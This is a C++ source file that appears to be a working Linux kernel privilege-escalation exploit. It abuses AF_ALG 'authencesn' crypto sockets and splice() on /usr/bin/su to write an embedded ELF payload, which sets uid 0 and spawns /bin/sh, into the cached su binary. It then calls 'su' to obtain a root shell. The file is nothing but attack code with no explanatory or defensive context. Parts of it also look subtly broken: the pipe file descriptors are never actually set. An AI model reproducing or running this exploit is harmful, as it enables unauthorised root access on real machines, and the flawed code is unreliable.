#include <iostream>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>

#define SOL_ALG 279

static const unsigned char payload[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x9e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x9e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0xc0, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05,
    0x48, 0x8d, 0x3d, 0x0f, 0x00, 0x00, 0x00, 0x31,
    0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05, 0x31,
    0xff, 0x6a, 0x3c, 0x58, 0x0f, 0x05, 0x2f, 0x62,
    0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x00, 0x00
};

static void spray_chunk(int su_fd, int offset, const unsigned char chunk[4]) {
    int alg_sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_sock < 0) return;

    struct sockaddr_alg sa = {};
    sa.salg_family = AF_ALG;
    strcpy((char*)sa.salg_type, "aead");
    strcpy((char*)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))");
    if (bind(alg_sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        close(alg_sock);
        return;
    }

    unsigned char key[40] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
    setsockopt(alg_sock, SOL_ALG, 1, key, sizeof(key));
    setsockopt(alg_sock, SOL_ALG, 5, NULL, 4);

    int op_sock = accept(alg_sock, NULL, 0);
    if (op_sock < 0) {
        close(alg_sock);
        return;
    }

    int data_size = offset + 4;

    unsigned char null_byte[1] = {0x00};
    struct msghdr msg = {};
    char cbuf[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)] = {};
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof(cbuf);

    struct cmsghdr* cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG; cm->cmsg_type = 3; cm->cmsg_len = CMSG_LEN(4);
    memset(CMSG_DATA(cm), 0, 4);

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG; cm->cmsg_type = 2; cm->cmsg_len = CMSG_LEN(20);
    memset(CMSG_DATA(cm), 0, 20);
    ((unsigned char*)CMSG_DATA(cm))[0] = 0x10;

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG; cm->cmsg_type = 4; cm->cmsg_len = CMSG_LEN(4);
    memset(CMSG_DATA(cm), 0, 4);
    ((unsigned char*)CMSG_DATA(cm))[0] = 0x08;

    unsigned char data[8];
    memcpy(data, "AAAA", 4);
    memcpy(data + 4, chunk, 4);
    struct iovec iov = { data, 8 };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    sendmsg(op_sock, &msg, MSG_MORE);

    lseek(su_fd, 0, SEEK_SET);

    int pipe_read, pipe_write;
    if (pipe((int[]){pipe_read, pipe_write}) == 0) {
        splice(su_fd, NULL, pipe_write, NULL, data_size, 0);
        splice(pipe_read, NULL, op_sock, NULL, data_size, 0);
        close(pipe_read);
        close(pipe_write);
    }

    unsigned char dummy[4096];
    recv(op_sock, dummy, sizeof(dummy), MSG_DONTWAIT);

    if (offset % 32 != 0) {
        close(op_sock);
        close(alg_sock);
    } else {
        usleep(100);
    }
}

int main() {
    int su_fd = open("/usr/bin/su", O_RDONLY);
    if (su_fd < 0) {
        perror("open /usr/bin/su");
        return 1;
    }

    int payload_len = sizeof(payload);

    std::cout << "[*] Splaying kernel memory..." << std::endl;

    for (int offset = 0; offset < payload_len; offset += 4) {
        spray_chunk(su_fd, offset, payload + offset);
    }

    std::cout << "[+] Splay finished." << std::endl;
    std::cout << "[*] Trying to trigger su..." << std::endl;

    system("su");
    close(su_fd);
    return 0;
}